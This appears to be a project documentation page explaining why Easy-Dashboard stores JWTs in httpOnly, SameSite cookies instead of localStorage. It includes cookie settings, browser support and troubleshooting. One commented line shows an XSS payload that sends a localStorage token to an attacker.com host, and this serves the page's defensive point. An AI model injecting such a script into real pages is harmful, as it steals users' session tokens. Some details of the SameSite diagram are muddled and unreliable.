# Cookie Strategy

Easy-Dashboard uses httpOnly cookies for token storage to prevent XSS attacks.

## Cookie Configuration

```typescript
// controllers/authController.ts:31-36
const cookieOptions = {
  httpOnly: true, // Prevents JavaScript access
  secure: true, // HTTPS only in production
  sameSite: 'strict' as const, // CSRF protection
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days for refresh token
};
```

## Cookie Attributes Explained

| Attribute  | Value                             | Purpose                                                             |
| ---------- | --------------------------------- | ------------------------------------------------------------------- |
| `httpOnly` | `true`                            | **Critical Security** - Prevents JavaScript access (XSS protection) |
| `secure`   | `true` in prod                    | Send only over HTTPS                                                |
| `sameSite` | `'strict'`                        | **CSRF Protection** - Cookie sent only to origin site               |
| `maxAge`   | 900s (access) / 604800s (refresh) | Token expiry                                                        |

## Why Not localStorage?

### localStorage (Previous Implementation - ❌)

```javascript
// VULNERABLE TO XSS
localStorage.setItem('token', jwtToken);

// Attack: Script tag injection steals token
// <script>new Image().src='https://attacker.com?c='+localStorage.getItem('token')</script>
```

### httpOnly Cookies (Current - ✅)

```typescript
// SECURE - Cannot be accessed by JavaScript
res.cookie('token', accessToken, { httpOnly: true });

// Attack: XSS script cannot read cookie
// document.cookie returns empty for httpOnly cookies
```

## Frontend Integration

### Setting Cookies (Server)

```typescript
// Backend sets cookie - frontend never sees the token
res.cookie('token', accessToken, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'strict',
  maxAge: 15 * 60 * 1000, // 15 minutes
});
```

### Reading Cookies (Client)

```typescript
// Frontend uses credentials: 'include' for API calls
fetch('/api/lead/list', {
  credentials: 'include', // Sends cookies automatically
});

// Token is NEVER accessible via JavaScript
// const token = localStorage.getItem('token')  // ❌ Returns null
```

### Cookie Sending Behavior

```
┌─────────────────────────────────────────────────────────────┐
│                    Cookie Sending Rules                      │
├─────────────────────────────────────────────────────────────┤
│ SameSite=Strict:                                            │
│   ✓ GET /api/lead/list  (same origin)                      │
│   ✗ POST /api/auth/login (different origin)                 │
├─────────────────────────────────────────────────────────────┤
│ SameSite=Lax:                                               │
│   ✓ GET /api/lead/list  (same origin)                      │
│   ✓ POST /api/auth/login (top-level navigation)             │
│   ✗ POST /api/auth/login (iframe, AJAX)                    │
├─────────────────────────────────────────────────────────────┤
│ SameSite=None (requires Secure):                            │
│   ✓ Cross-origin API calls                                 │
│   ✗ Without HTTPS                                           │
└─────────────────────────────────────────────────────────────┘
```

## Browser Compatibility

| Browser     | httpOnly Support | SameSite Support         |
| ----------- | ---------------- | ------------------------ |
| Chrome 80+  | ✅ Full          | ✅ Full                  |
| Firefox 69+ | ✅ Full          | ✅ Full                  |
| Safari 12+  | ✅ Full          | ✅ Partial (Lax default) |
| Edge 79+    | ✅ Full          | ✅ Full                  |
| IE 11       | ✅ Full          | ❌ Ignored               |

## Troubleshooting

### Cookie Not Sent

1. Check `credentials: 'include'` in fetch/axios
2. Verify CORS includes cookies: `credentials: true`
3. Ensure no custom domain issues in development

### "Cookie blocked"

1. Check third-party cookie settings in browser
2. For localhost, use `sameSite: 'lax'` in development

## Production Checklist

- [x] `httpOnly: true` - Prevents XSS token theft
- [x] `secure: true` in production - HTTPS only
- [x] `sameSite: 'strict'` - CSRF protection
- [x] Short access token maxAge (15 min)
- [x] Long refresh token maxAge (7 days)
- [ ] Consider `__Host-` prefix for additional security
